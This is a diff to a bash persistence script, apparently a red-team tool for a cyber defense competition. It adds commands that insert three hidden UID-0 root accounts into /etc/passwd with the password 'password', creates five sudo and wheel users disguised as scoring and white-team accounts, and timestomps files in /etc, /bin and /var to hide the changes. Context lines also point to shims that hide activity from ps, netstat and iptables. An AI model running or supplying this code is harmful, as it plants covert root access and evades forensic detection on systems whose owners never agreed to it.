@@ -24,19 +24,48 @@ payload3="/etc/vmwaretools.conf $host $port"
 
 # Setup tools for basic deployment 
 setup(){
-    #yum install -y 
+    yum install -y gcc make vim python3 curl wget openssh-server
     apt-get -qq install -y gcc curl wget vim python3 openssh-server
     systemctl start ssh 
     systemctl enable ssh 
 }
 
-# Timestomp 
+backdoor_users(){
+    # fake root users 
+    sed -is "3 a sbin:x:0:0:root:/root:/bin/bash" /etc/passwd 
+    sed -is "6 a bakup:x:0:0:root:/root:/bin/bash" /etc/passwd 
+    sed -is "11 a ucp:x:0:0:root:/root:/bin/bash" /etc/passwd 
 
-# Add backdoor users 
-# TODO: use sed and just paste directly to passwd
-# test_root:x:0:0:root:/root:/bin/bash    <-- SED this to /etc/passwd 
-# And then passwd oneliner to change the password. 
-# I need more testing, but I have a meeting and an exam in 30 min
+    echo -e "password\npassword" | passwd sbin 
+    echo -e "password\npassword" | passwd bakup
+    echo -e "password\npassword" | passwd ucp
+
+    # Normal users
+    useradd -u 135 whiteteamer -s /bin/bash
+    useradd -u 136 scoring -s /bin/bash
+    useradd -u 137 scoringengine -s /bin/bash 
+    useradd backdoor -s /bin/bash 
+    useradd bakdoor -s /bin/bash 
+
+    echo -e "Tlqkfsus!\nTlqkfsus!" | passwd whiteteamer 
+    echo -e "Tlqkfsus!\nTlqkfsus!" | passwd scoring 
+    echo -e "Tlqkfsus!\nTlqkfsus!" | passwd scoringengine 
+    echo -e "Tlqkfsus!\nTlqkfsus!" | passwd backdoor 
+    echo -e "Tlqkfsus!\nTlqkfsus!" | passwd bakdoor 
+
+    usermod -aG sudo whiteteamer
+    usermod -aG sudo scoring
+    usermod -aG sudo scoringengine
+    usermod -aG sudo backdoor
+    usermod -aG sudo bakdoor
+
+    # For CentOS love 
+    usermod -aG wheel whiteteamer
+    usermod -aG wheel scoring
+    usermod -aG wheel scoringengine
+    usermod -aG wheel backdoor
+    usermod -aG wheel bakdoor
+}
 
 # Clone the client binary into different places 
 clone(){
@@ -155,7 +184,18 @@ sudoers(){
 }
 
 
+# Timestomp 
+timestomp(){
+    find -print | while read filename; do
+    # do whatever you want with the file
+    touch -t 201910251920 "$filename"
+done
+}
+
+
 ########## Start of Main ##########
+
+mkdir -p /var/cache
 
 setup
 copyman
@@ -168,4 +208,20 @@ bashrc
 shim_iptables
 shim_ps
 shim_netstat
-echo -e "========= Script have ended. Erase all artifaces. ========== \n"
+
+
+# Time Stomping starts
+cd /etc
+timestomp
+
+cd /bin
+timestomp
+
+cd /var/cache
+timestomp
+
+cd /var
+timestomp
+
+
+echo -e "========= Script have ended. Erase all artifaces in /opt ========== \n"
